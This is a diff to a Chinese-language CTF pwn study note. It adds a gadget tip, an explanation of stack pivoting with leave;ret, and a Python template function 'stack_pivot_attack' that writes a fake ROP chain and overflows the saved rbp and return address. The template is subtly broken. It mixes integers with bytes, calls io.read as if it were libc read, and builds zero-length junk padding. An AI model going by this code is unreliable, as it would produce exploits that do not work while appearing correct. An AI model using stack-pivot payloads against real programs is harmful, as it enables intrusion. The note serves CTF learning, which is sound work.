@@ -119,9 +119,9 @@ syscall 执行系统调用
 需要注意：
 
 - 如果找不到对应的64位寄存器的gadget，可以尝试找找32位寄存器的，前提是参数可以只取低地址4个字节，不受高字节的影响。
-
 - rax/eax会存放函数的返回值，所以，有时候找不到eax相关的gadget可以利用返回值来构造。
 - 很缺gadget的话，可以利用ret2csu完成攻击
+- 有时候缺少写入函数的话，可以利用`lea`或者`mov`指令完成写入。
 
 再总结一下常用的系统调用号对应函数：
 
@@ -276,4 +276,29 @@ def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
 **使用**：栈迁移攻击的题目很有特点，需要滿足两个条件：1）可泄露地址或者程序不开启PIE；2）栈溢出超过ebp指针的字节为2个指针大小，刚好只能覆盖到函数返回地址。在32位系统下，溢出ebp指针后8个字节，64位系统下，溢出rbp指针后16个字节。例如在64位系统下，栈变量buffer距离rbp为0x30字节大小，程序可以往buffer最多写入0x40个字节。
 
 **原理**：栈溢出的原理并不复杂，核心是利用`leave;ret`这一个gadget。在64为系统下，该gadget的含义其实包括两条指令：`mov rbp rsp, pop rbp;pop rip`。将`rsp`移动到`rbp`指向的位置，然后`pop rbp`，将栈顶指针指向的内容存入到`rbp`寄存器，然后`rsp `往高地址移动8个字节，再执行`pop rip`，将此时栈顶指针的内容赋给`rip`寄存器，开始执行程序流。
+
+```python
+def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
+    '''
+    栈迁移：程序溢出的字节数为两个指针大小，只能覆盖到函数返回地址
+    将栈迁移到其他可写入的地方，如bss段，data段，libc的free_hook上方
+    需要寻找一个leave;ret的gadget, 这里以64位为例
+    
+    '''  
+    # 第一步是往fake_rbp_addr写入rop链
+    payload = fake_rbp_addr + 0x200 # fake rbp 2
+    payload += 0x0 # 这里开始，可以填写真正的rop链，如要执行的函数地址等
+    # ......
+    io.read(0, fake_rbp_addr, 0x60) # 触发某写入函数，往地址里面写入ROP
+    
+    # 第二步是控制栈溢出
+    payload = 0x0 * b'a' # junk data
+    payload += p64(fake_rbp_addr) # 填充rbp
+    payload += p64(leave_ret_addr) # 填充返回地址
+    io.send(payload)
+    
+    # 之后，程序会取执行rop链
+```
+
+#### 2.6 ret2sigreturn
 
